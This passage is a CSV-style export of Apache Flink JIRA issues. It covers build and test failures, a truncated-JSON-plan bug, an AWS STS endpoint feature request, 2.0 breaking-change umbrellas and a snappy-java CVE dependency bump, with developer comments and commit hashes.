<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Critical,Fixed,Sergey Nuyanzin,chesnay,chesnay,19/Jun/23 09:20,29/Jun/23 08:45,04/Jun/24 20:41,29/Jun/23 08:45,,,,,,,,,,,,,,,1.18.0,,,,,,Build System,,,,0,pull-request-available,test-stability,,"When compiling to Java 11/17 byte code archunit fails; not sure why. Maybe it finds more/less stuff or signatures are represented differently.

In any case let's use the Java 8 bytecode version as the ""canonical"" version and skip archunit otherwise.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Thu Jun 29 08:45:56 UTC 2023,,,,,,,,,,"0|z1in6o:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"19/Jun/23 09:30;Sergey Nuyanzin;Do you happen to know how to reproduce locally?

Unfortunately I couldn't so far... both jdk8 and jdk11 are ok for me....;;;","19/Jun/23 13:10;chesnay;Nope, I also couldn't reproduce it.

But it is clearly failing on CI:
* 11: https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=50160&view=logs&j=298e20ef-7951-5965-0e79-ea664ddc435e&t=d4c90338-c843-57b0-3232-10ae74f00347
* 17: https://dev.azure.com/chesnay/flink/_build/results?buildId=3643&view=results

oooooh I think we need to set -Darchunit.freeze.store.default.allowStoreUpdate=false to get it to fail....;;;","19/Jun/23 14:00;chesnay;{code}
maven clean install -DskipTests -Dfast -Pjava17-target
mvn verify -pl flink-architecture-tests/flink-architecture-tests-production/ -Darchunit.freeze.store.default.allowStoreUpdate=false
{code};;;","19/Jun/23 14:08;chesnay;There seem to be some differences in the bytecode w.r.t. constructors; this exemption is added with Java8, but removed on 11+:

{code}
Constructor <org.apache.flink.connector.file.src.FileSource.<init>([Lorg.apache.flink.core.fs.Path;, org.apache.flink.connector.file.src.enumerate.FileEnumerator$Provider, org.apache.flink.connector.file.src.assigners.FileSplitAssigner$Provider, org.apache.flink.connector.file.src.reader.BulkFormat, org.apache.flink.connector.file.src.ContinuousEnumerationSettings, org.apache.flink.connector.file.src.FileSource$1)> has parameter of type <[Lorg.apache.flink.core.fs.Path;> in (FileSource.java:0)
{code}

Note the {{org.apache.flink.connector.file.src.FileSource$1}} constructor argument, which doesn't actually exist in the source.;;;","20/Jun/23 09:34;Sergey Nuyanzin;thanks for the hint
yes, confirmed, I was able to reproduce it now.

Currently it's not clear from the ArchUnit doc how to deal with it..
so I raise an issue , hope there will be an answer https://github.com/TNG/ArchUnit/issues/1124

{quote}
In any case let's use the Java 8 bytecode version as the ""canonical"" version and skip archunit otherwise.
{quote}
yes, seems currently the only way to go...;;;","20/Jun/23 12:13;chesnay;The simple solution could be to annotate the architecture tests with {{@FailsOnJava11/17}}; I'd hope that this works with archunit.;;;","20/Jun/23 15:56;Sergey Nuyanzin;-That I'm not sure....-
-Currently there is in use archunit which is junit5 based...-
-In this case instead of {{@Category}} there should be used {{{}@Tag{}}}.-
{-}At the same time rules are written in fields... while {{@Tag}} could be applied to type and methods only...{-}-

UPD: it seems {{@ArchTag}} does the thing
this works locally
{code:java}
    @ArchTest
    @ArchTag(value = ""org.apache.flink.testutils.junit.FailsOnJava11"")
    @ArchTag(value = ""org.apache.flink.testutils.junit.FailsOnJava17"")
    public static final ArchRule CONNECTOR_CLASSES_ONLY_DEPEND_ON_PUBLIC_API =
...
{code};;;","26/Jun/23 22:28;Sergey Nuyanzin;since it's failing ci builds on mirror I upgrade it to critical
https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=50360&view=logs&j=298e20ef-7951-5965-0e79-ea664ddc435e&t=d4c90338-c843-57b0-3232-10ae74f00347&l=23263;;;","26/Jun/23 22:29;Sergey Nuyanzin;[~chesnay] are you ok with {{@ArchTag}} approach?
I could submit a PR for that.
I'm asking since the task is assigned to you;;;","27/Jun/23 08:22;chesnay;If it works, go ahead.;;;","29/Jun/23 08:45;chesnay;master: 74ae4b24683b4de702c01ef0969a5b9e8262bdef;;;",,,,,,,,,,,,
2.0 Breaking Metric system changes,FLINK-32378,13540586,,Technical Debt,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,,chesnay,chesnay,chesnay,19/Jun/23 09:03,19/Jun/23 09:03,04/Jun/24 20:41,,,,,,,,,,,,,,,,2.0.0,,,,,,Runtime / Metrics,,,,0,,,,Umbrella issue for all breaking changes to the metric system,,,,,,,0,1200,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,2023-06-19 09:03:16.0,,,,,,,,,,"0|z1in4w:",9223372036854775807,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
2.0 Breaking REST API changes,FLINK-32377,13540585,,Technical Debt,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,,chesnay,chesnay,chesnay,19/Jun/23 09:01,19/Jun/23 09:03,04/Jun/24 20:41,,,,,,,,,,,,,,,,2.0.0,,,,,,Runtime / REST,,,,0,,,,Umbrella issue for all breaking changes to the REST API.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,2023-06-19 09:01:24.0,,,,,,,,,,"0|z1in4o:",9223372036854775807,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"[FLIP-287] Extend Sink#InitContext to expose TypeSerializer, ObjectReuse and JobID",FLINK-32376,13540580,,Improvement,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Done,eskabetxe,eskabetxe,eskabetxe,19/Jun/23 08:31,11/Jul/23 10:30,04/Jun/24 20:41,10/Jul/23 12:34,,,,,,,,,,,,,,,1.18.0,,,,,,,,,,0,pull-request-available,,,"Implementation of FLIP-287 (linked)
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Mon Jul 10 12:34:08 UTC 2023,,,,,,,,,,"0|z1in3k:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"10/Jul/23 12:34;wanglijie;Done via:
master(1.18): 4f5b2fb5736f5a1c098a7dc1d448a879f36f801b;;;",,,,,,,,,,,,,,,,,,,,,,
Flink AWS Source AssumeRole in VPC,FLINK-32375,13540570,,New Feature,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Duplicate,,tomas.witzany,tomas.witzany,19/Jun/23 07:52,21/Jun/23 11:18,04/Jun/24 20:41,19/Jun/23 10:33,1.15.4,,,,,,,,,,,,,,,,,,,,Connectors / AWS,,,,0,,,,"Current way to configure auth against AWS supports assuming a role, but when you assume a role in a VPC without a NAT gateway, the global STS endpoint is not accessible. And there is no way to configure the provider to use a different endpoint.

This means that there currently is no supported way to configure AWS auth in such a situation. Note that you can add an sts endpoint to a VPC, but its always a regional endpoint, not the global endpoint.

Options on how you can configure this:
 * configuring the aws DefaultsMode, by default legacy, to in-region:
 ** environment variables - not possible in KDA
 ** system variables - not possible in KDA
 ** aws config file - not possible in KDA
 * adding endpoint configuration options to the assume role provider

The piece of code that creates the provider and how it could be extended to support endpoint configuration (just an example)
{code:java}
private static AwsCredentialsProvider getAssumeRoleCredentialProvider(
        final Properties configProps, final String configPrefix) {
    return StsAssumeRoleCredentialsProvider.builder()
            .refreshRequest(
                    AssumeRoleRequest.builder()
                            .roleArn(
                                    configProps.getProperty(
                                            AWSConfigConstants.roleArn(configPrefix)))
                            .roleSessionName(
                                    configProps.getProperty(
                                            AWSConfigConstants.roleSessionName(configPrefix)))
                            .externalId(
                                    configProps.getProperty(
                                            AWSConfigConstants.externalId(configPrefix)))
                            .build())
            .stsClient(
                    StsClient.builder()
                            .credentialsProvider(
                                    getCredentialsProvider(
                                            configProps,
                                            AWSConfigConstants.roleCredentialsProvider(
                                                    configPrefix)))
                            .endpointOverride(new URI( // added code
                                    configProps.getProperty(AWSConfigConstants.endpointOverride(configPrefix)) // added code
                            )) // added code
                            .region(getRegion(configProps))
                            .build())
            .build();
} {code}
 

I am not entirely certain that there is no other way to configure this in my situation, my current plan is to build my own version of the connectors with this option supported. If a feature like this would be nice to have, I would be happy to share my results in a PR afterwards.

However,  if there is a better way to configure this, I would be happy to hear about it. If you know of some trick to do this in KDA, where you have limited options to configure things.

Some other options to attack this problem:
 * trying to set system properties on the task manager before the kinesis source is initialized - this is hard as you dont have control over execution order, probably doable though with some hacks
 * ask AWS support to set a system property with flink config file options - this is hard as it will involve aws support
 * add a NAT gateway to the VPC - this will not be always an option because of security reasons","Flink 1.15.4

running on Amazon KDA (managed flink)

runtime is running inside a VPC

input stream cross-account",,,,,,,,,,,,,,,,,,,FLINK-29496,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Wed Jun 21 11:18:47 UTC 2023,,,,,,,,,,"0|z1in1c:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"19/Jun/23 10:33;dannycranmer;Hello. This is fixed in Flink 1.17 (FLINK-29496). Unfortunately we cannot backport to Flink 1.15 due to the version support policy. If you are willing to build the connector from source, consider backporting the fix (https://github.com/apache/flink/pull/21129) yourself ;;;","21/Jun/23 11:18;tomas.witzany;Thanks for the reply, ill look into backporting the fix.;;;",,,,,,,,,,,,,,,,,,,,,
ExecNodeGraphInternalPlan#writeToFile should support TRUNCATE_EXISTING for overwriting,FLINK-32374,13540540,,Bug,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,qingyue,qingyue,qingyue,19/Jun/23 01:25,20/Jun/23 01:49,04/Jun/24 20:41,20/Jun/23 01:49,1.16.0,1.16.1,1.16.2,1.17.0,1.17.1,1.18.0,,,,,,,,,1.18.0,,,,,,Table SQL / Planner,,,,0,pull-request-available,,,"If the existing JSON plan is not truncated when overwriting, and the newly generated JSON plan contents are shorter than the previous JSON plan content, the plan be an invalid JSON.
h4. How to reproduce
{code:sql}
Flink SQL> create table debug_sink (f0 int, f1 string) with ('connector' = 'blackhole');
[INFO] Execute statement succeed.

Flink SQL> create table dummy_source (f0 int, f1 int, f2 string, f3 string) with ('connector' = 'datagen');
[INFO] Execute statement succeed.

Flink SQL> compile plan '/foo/bar/debug.json' for insert into debug_sink select if(f0 > f1, f0, f1) as f0, concat(f2, f3) as f1 from dummy_source;
[INFO] Execute statement succeed.

Flink SQL> set 'table.plan.force-recompile' = 'true';
[INFO] Execute statement succeed.

Flink SQL> compile plan '/foo/bar/debug.json' for insert into debug_sink select * from (values (2, 'bye')) T (id, message);
[INFO] Execute statement succeed.
{code}
cat -n debug.json, and check L#67
{code:json}
     1	{
     2	  ""flinkVersion"" : ""1.17"",
     3	  ""nodes"" : [ {
     4	    ""id"" : 15,
     5	    ""type"" : ""stream-exec-values_1"",
     6	    ""tuples"" : [ [ {
     7	      ""kind"" : ""LITERAL"",
     8	      ""value"" : ""2"",
     9	      ""type"" : ""INT NOT NULL""
    10	    }, {
    11	      ""kind"" : ""LITERAL"",
    12	      ""value"" : ""bye"",
    13	      ""type"" : ""CHAR(3) NOT NULL""
    14	    } ] ],
    15	    ""outputType"" : ""ROW<`id` INT NOT NULL, `message` CHAR(3) NOT NULL>"",
    16	    ""description"" : ""Values(tuples=[[{ 2, _UTF-16LE'bye' }]])"",
    17	    ""inputProperties"" : [ ]
    18	  }, {
    19	    ""id"" : 16,
    20	    ""type"" : ""stream-exec-sink_1"",
    21	    ""configuration"" : {
    22	      ""table.exec.sink.keyed-shuffle"" : ""AUTO"",
    23	      ""table.exec.sink.not-null-enforcer"" : ""ERROR"",
    24	      ""table.exec.sink.type-length-enforcer"" : ""IGNORE"",
    25	      ""table.exec.sink.upsert-materialize"" : ""AUTO""
    26	    },
    27	    ""dynamicTableSink"" : {
    28	      ""table"" : {
    29	        ""identifier"" : ""`default_catalog`.`default_database`.`debug_sink`"",
    30	        ""resolvedTable"" : {
    31	          ""schema"" : {
    32	            ""columns"" : [ {
    33	              ""name"" : ""f0"",
    34	              ""dataType"" : ""INT""
    35	            }, {
    36	              ""name"" : ""f1"",
    37	              ""dataType"" : ""VARCHAR(2147483647)""
    38	            } ],
    39	            ""watermarkSpecs"" : [ ]
    40	          },
    41	          ""partitionKeys"" : [ ],
    42	          ""options"" : {
    43	            ""connector"" : ""blackhole""
    44	          }
    45	        }
    46	      }
    47	    },
    48	    ""inputChangelogMode"" : [ ""INSERT"" ],
    49	    ""inputProperties"" : [ {
    50	      ""requiredDistribution"" : {
    51	        ""type"" : ""UNKNOWN""
    52	      },
    53	      ""damBehavior"" : ""PIPELINED"",
    54	      ""priority"" : 0
    55	    } ],
    56	    ""outputType"" : ""ROW<`id` INT NOT NULL, `message` CHAR(3) NOT NULL>"",
    57	    ""description"" : ""Sink(table=[default_catalog.default_database.debug_sink], fields=[id, message])""
    58	  } ],
    59	  ""edges"" : [ {
    60	    ""source"" : 15,
    61	    ""target"" : 16,
    62	    ""shuffle"" : {
    63	      ""type"" : ""FORWARD""
    64	    },
    65	    ""shuffleMode"" : ""PIPELINED""
    66	  } ]
    67	} ""$CONCAT$1"",
    68	      ""operands"" : [ {
    69	        ""kind"" : ""INPUT_REF"",
    70	        ""inputIndex"" : 2,
    71	        ""type"" : ""VARCHAR(2147483647)""
    72	      }, {
    73	        ""kind"" : ""INPUT_REF"",
    74	        ""inputIndex"" : 3,
    75	        ""type"" : ""VARCHAR(2147483647)""
    76	      } ],
    77	      ""type"" : ""VARCHAR(2147483647)""
    78	    } ],
    79	    ""condition"" : null,
    80	    ""inputProperties"" : [ {
    81	      ""requiredDistribution"" : {
    82	        ""type"" : ""UNKNOWN""
    83	      },
    84	      ""damBehavior"" : ""PIPELINED"",
    85	      ""priority"" : 0
    86	    } ],
    87	    ""outputType"" : ""ROW<`f0` INT, `f1` VARCHAR(2147483647)>"",
    88	    ""description"" : ""Calc(select=[IF((f0 > f1), f0, f1) AS f0, CONCAT(f2, f3) AS f1])""
    89	  }, {
    90	    ""id"" : 14,
    91	    ""type"" : ""stream-exec-sink_1"",
    92	    ""configuration"" : {
    93	      ""table.exec.sink.keyed-shuffle"" : ""AUTO"",
    94	      ""table.exec.sink.not-null-enforcer"" : ""ERROR"",
    95	      ""table.exec.sink.type-length-enforcer"" : ""IGNORE"",
    96	      ""table.exec.sink.upsert-materialize"" : ""AUTO""
    97	    },
    98	    ""dynamicTableSink"" : {
    99	      ""table"" : {
   100	        ""identifier"" : ""`default_catalog`.`default_database`.`debug_sink`"",
   101	        ""resolvedTable"" : {
   102	          ""schema"" : {
   103	            ""columns"" : [ {
   104	              ""name"" : ""f0"",
   105	              ""dataType"" : ""INT""
   106	            }, {
   107	              ""name"" : ""f1"",
   108	              ""dataType"" : ""VARCHAR(2147483647)""
   109	            } ],
   110	            ""watermarkSpecs"" : [ ]
   111	          },
   112	          ""partitionKeys"" : [ ],
   113	          ""options"" : {
   114	            ""connector"" : ""blackhole""
   115	          }
   116	        }
   117	      }
   118	    },
   119	    ""inputChangelogMode"" : [ ""INSERT"" ],
   120	    ""inputProperties"" : [ {
   121	      ""requiredDistribution"" : {
   122	        ""type"" : ""UNKNOWN""
   123	      },
   124	      ""damBehavior"" : ""PIPELINED"",
   125	      ""priority"" : 0
   126	    } ],
   127	    ""outputType"" : ""ROW<`f0` INT, `f1` VARCHAR(2147483647)>"",
   128	    ""description"" : ""Sink(table=[default_catalog.default_database.debug_sink], fields=[f0, f1])""
   129	  } ],
   130	  ""edges"" : [ {
   131	    ""source"" : 12,
   132	    ""target"" : 13,
   133	    ""shuffle"" : {
   134	      ""type"" : ""FORWARD""
   135	    },
   136	    ""shuffleMode"" : ""PIPELINED""
   137	  }, {
   138	    ""source"" : 13,
   139	    ""target"" : 14,
   140	    ""shuffle"" : {
   141	      ""type"" : ""FORWARD""
   142	    },
   143	    ""shuffleMode"" : ""PIPELINED""
   144	  } ]
   145	}
{code}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FLINK-31956,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Mon Jun 19 09:23:08 UTC 2023,,,,,,,,,,"0|z1imuw:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"19/Jun/23 09:23;luoyuxia;master: f69ed3454f2ab200310edee230da292ee2408503

1.17: 3b5c1f7915ecfe0f7e353fd342f8d22df5bcd7c4

1.16: 08bced4646c4bef9aca7089d0764426d78a89b0a;;;",,,,,,,,,,,,,,,,,,,,,,
Support passing headers with SQL Client gateway requests,FLINK-32373,13540485,,Improvement,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,afedulov,afedulov,afedulov,17/Jun/23 13:16,06/Jul/23 19:37,04/Jun/24 20:41,06/Jul/23 19:37,1.18.0,,,,,,,,,,,,,,1.18.0,,,,,,Table SQL / Client,Table SQL / Gateway,,,0,pull-request-available,,,"FLINK-32030 and FLINK-32035 enable communication from the SQL Client to the SQL Gateway placed behind a proxy, such as a K8S ingress. Given that authentication is typically needed in these cases, it can be achieved by adding the ability to supply custom headers to the underlying RestClient.  ",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,2023-06-17 13:16:42.0,,,,,,,,,,"0|z1imio:",9223372036854775807,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
flink-connector-aws: build on pull request / compile_and_test doesn't support for Flink 1.16.2 and 1.17.1,FLINK-32372,13540474,,Improvement,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,samrat007,samrat007,samrat007,17/Jun/23 07:11,24/Jun/23 08:16,04/Jun/24 20:41,24/Jun/23 08:15,,,,,,,,,,,,,,,aws-connector-4.2.0,,,,,,Connectors / AWS,,,,0,pull-request-available,,,"*Recently* {*}1.16.2 and 1.17.1 flink version are released.{*}{*}{*}

*flink-connector-aws: build on pull request / compile_and_test currently doesn't support 1.16.2 and 1.17.1 flink version.* 

*Add the support to build and test for*  \{*}1.16.2 and 1.17.1 flink version on CI pipeline for flink-connector-aws.{*}{*}{*}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Sat Jun 24 08:15:46 UTC 2023,,,,,,,,,,"0|z1img8:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"24/Jun/23 08:15;dannycranmer;merged commit 3c127ba into apache:main ;;;",,,,,,,,,,,,,,,,,,,,,,
Bump snappy-java to 1.1.10.1,FLINK-32371,13540442,,Improvement,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,rskraba,rskraba,rskraba,16/Jun/23 18:38,20/Jun/23 06:03,04/Jun/24 20:41,20/Jun/23 06:03,1.16.2,1.17.1,1.18.0,,,,,,,,,,,,1.16.3,1.17.2,1.18.0,,,,Build System,,,,0,pull-request-available,,,"There is a CVE in all versions of snappy prior to 1.1.10.1 https://nvd.nist.gov/vuln/detail/CVE-2023-34455

",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Mon Jun 19 08:42:35 UTC 2023,,,,,,,,,,"0|z1ima0:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"19/Jun/23 08:42;mapohl;master: ba47237a0a44222a275ba7a1d144822466d20f15
1.17: 875c5900ed5ddaa187549c3bb62dd3bca679cfc5
1.16: 15061adddddb9eb049b679895c44454ca26b3186;;;",,,,,,,,,,,,,,,,,,,,,,
JDBC SQl gateway e2e test is unstable,FLINK-32370,13540411,,Technical Debt,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Blocker,Fixed,zjureel,chesnay,chesnay,16/Jun/23 13:45,04/Jul/23 12:07,04/Jun/24 20:41,04/Jul/23 12:07,1.18.0,,,,,,,,,,,,,,1.18.0,,,,,,Tests,,,,0,pull-request-available,test-stability,,"The client is failing while trying to collect data when the job already finished on the cluster.
",,,,,,,,,,,,,,,,,,FLINK-32382,,,,,,,,FLINK-31673,,,,,,"16/Jun/23 13:45;chesnay;flink-vsts-sql-gateway-0-fv-az75-650.log;https://issues.apache.org/jira/secure/attachment/13059142/flink-vsts-sql-gateway-0-fv-az75-650.log","16/Jun/23 13:45;chesnay;flink-vsts-standalonesession-0-fv-az75-650.log;https://issues.apache.org/jira/secure/attachment/13059141/flink-vsts-standalonesession-0-fv-az75-650.log","16/Jun/23 13:45;chesnay;flink-vsts-taskexecutor-0-fv-az75-650.log;https://issues.apache.org/jira/secure/attachment/13059140/flink-vsts-taskexecutor-0-fv-az75-650.log",,,,,,,,,,,,,,,,3.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Tue Jul 04 12:07:25 UTC 2023,,,,,,,,,,"0|z1im34:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"16/Jun/23 13:46;chesnay;Ping [~zjureel];;;","19/Jun/23 00:50;zjureel;Thanks [~chesnay], I'll look at it and try to fix it :);;;","20/Jun/23 03:15;libenchao;Fixed via https://github.com/apache/flink/commit/8119411addd9c82c15bab8480e7b35b8e6394d43

[~zjureel] Thanks for the fix!  
And thanks [~chesnay][~mapohl] for spotting the unstable tests.;;;","21/Jun/23 06:48;mapohl;[~zjureel] [This CI build|https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=50276&view=logs&j=af184cdd-c6d8-5084-0b69-7e9c67b35f7a&t=0f3adb59-eefa-51c6-2858-3654d9e0749d&l=3050] still has the issue appearing. The corresponding branch contains your fix from 8119411addd9c82c15bab8480e7b35b8e6394d43. May you have another look?;;;","21/Jun/23 09:00;zjureel;Thanks [~mapohl], I think I miss the error log in JobManager. I will fix it;;;","21/Jun/23 09:42;zjureel;[~mapohl] I have created a new PR https://github.com/apache/flink/pull/22838 for this. You can cherry-pick it as you need, and please feel free to ping me when there's any issue, thanks;;;","26/Jun/23 02:46;libenchao;Merged to master as https://github.com/apache/flink/commit/4248d05da092e3e580ac3238ea9af51151609e4f, feel free to reopen if the problem still exists.;;;","26/Jun/23 21:44;Sergey Nuyanzin;It seems the issue is still present

mirror build is failing with it
https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=50436&view=logs&j=af184cdd-c6d8-5084-0b69-7e9c67b35f7a&t=0f3adb59-eefa-51c6-2858-3654d9e0749d&l=3520

it contains both commits attached this JIRA issue.

[~zjureel] could you please have a look;;;","26/Jun/23 22:26;Sergey Nuyanzin;https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=50360&view=logs&j=fb37c667-81b7-5c22-dd91-846535e99a97&t=011e961e-597c-5c96-04fe-7941c8b83f23&l=3701;;;","26/Jun/23 22:31;Sergey Nuyanzin;https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=50353&view=logs&j=af184cdd-c6d8-5084-0b69-7e9c67b35f7a&t=0f3adb59-eefa-51c6-2858-3654d9e0749d&l=3450;;;","26/Jun/23 22:32;Sergey Nuyanzin;https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=50353&view=logs&j=fb37c667-81b7-5c22-dd91-846535e99a97&t=011e961e-597c-5c96-04fe-7941c8b83f23&l=3674;;;","27/Jun/23 06:31;Sergey Nuyanzin;https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=50467&view=logs&j=fb37c667-81b7-5c22-dd91-846535e99a97&t=011e961e-597c-5c96-04fe-7941c8b83f23&l=3673;;;","27/Jun/23 06:32;Sergey Nuyanzin;[~zjureel] , [~libenchao] could you please have a look here?;;;","27/Jun/23 14:54;zjureel;Thanks [~Sergey Nuyanzin] and sorry for the recurring issue. I have got the root cause and will create a PR for it;;;","28/Jun/23 00:25;zjureel;[~Sergey Nuyanzin] The PR https://github.com/apache/flink/pull/22882 for this issue, feel free to ping me when the issue is not fixed;;;","03/Jul/23 15:35;chesnay;master: b229ecd0d6db858f7022afea8dbddab3ac7d2048;;;","04/Jul/23 11:10;Sergey Nuyanzin;I'm going to reopen it since it is reproduced again for master containing latest commit
https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=50900&view=logs&j=af184cdd-c6d8-5084-0b69-7e9c67b35f7a&t=0f3adb59-eefa-51c6-2858-3654d9e0749d&l=3728;;;","04/Jul/23 11:11;Sergey Nuyanzin;[~zjureel]could you please have another look?;;;","04/Jul/23 11:30;zjureel;[~Sergey Nuyanzin] Sorry that I checked the shell and found the missing double quotation marks, I'll add it;;;","04/Jul/23 12:07;chesnay;master: 5ac5163a0f65bc9359a2c2b8ef35addce14413b1;;;",,,
Setup cron build,FLINK-32369,13540400,13281165,Sub-task,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,chesnay,chesnay,chesnay,16/Jun/23 13:05,16/Jun/23 19:51,04/Jun/24 20:41,16/Jun/23 19:51,,,,,,,,,,,,,,,1.18.0,,,,,,Build System / CI,,,,0,pull-request-available,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Fri Jun 16 19:51:53 UTC 2023,,,,,,,,,,"0|z1im0o:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"16/Jun/23 19:51;chesnay;master: 4624cc47bec135f369bcdf159b68bdd4566ce5af;;;",,,,,,,,,,,,,,,,,,,,,,
KubernetesTestFixture doesn't implement the checkAndUpdateConfigMapFunction properly,FLINK-32368,13540393,,Bug,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,mapohl,mapohl,mapohl,16/Jun/23 12:31,19/Jun/23 06:46,04/Jun/24 20:41,19/Jun/23 06:46,1.16.2,1.17.1,1.18.0,,,,,,,,,,,,1.16.3,1.17.2,1.18.0,,,,Deployment / Kubernetes,Tests,,,0,pull-request-available,,,"[FlinkKubeClient.checkAndUpdateConfigMap|https://github.com/apache/flink/blob/ab3eb40d920fa609f49164a0bbb5fcbb3004a808/flink-kubernetes/src/main/java/org/apache/flink/kubernetes/kubeclient/FlinkKubeClient.java#L163] expects an error to be forwarded through the {{CompletableFuture}} instead of throwing a {{RuntimeException}}.

The actual implementation implements it accordingly in [Fabric8FlinkKubeClient:313|https://github.com/apache/flink/blob/025a95b627faf8ec8b725a7784d1279b41e10ba7/flink-kubernetes/src/main/java/org/apache/flink/kubernetes/kubeclient/Fabric8FlinkKubeClient.java#L313] where a {{CompletionException}} is thrown within the {{CompletableFuture}}'s {{supplyAsync}} call resulting the future to fail.

{{KubernetesTestFixture}} doesn't make the returned future complete exceptionally but throws a {{CompletionException}} (see [KubernetesTestFixture:172|https://github.com/apache/flink/blob/6fc5f789869433688eb5f62494f1a4404e0dd11b/flink-kubernetes/src/test/java/org/apache/flink/kubernetes/highavailability/KubernetesTestFixture.java#L172]).

This results in inconsistent test behavior.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Fri Jun 16 15:41:24 UTC 2023,,,,,,,,,,"0|z1ilz4:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"16/Jun/23 15:41;mapohl;master: ed854c0240cf6f53fa6e784c8267e69ff88a06e6
1.17: c359fe884b6e23f47f7904c8be0d3081b05ebd48
1.16: d4bdca1f76ece7e73549b3379cbb8b81c8f5728f;;;",,,,,,,,,,,,,,,,,,,,,,
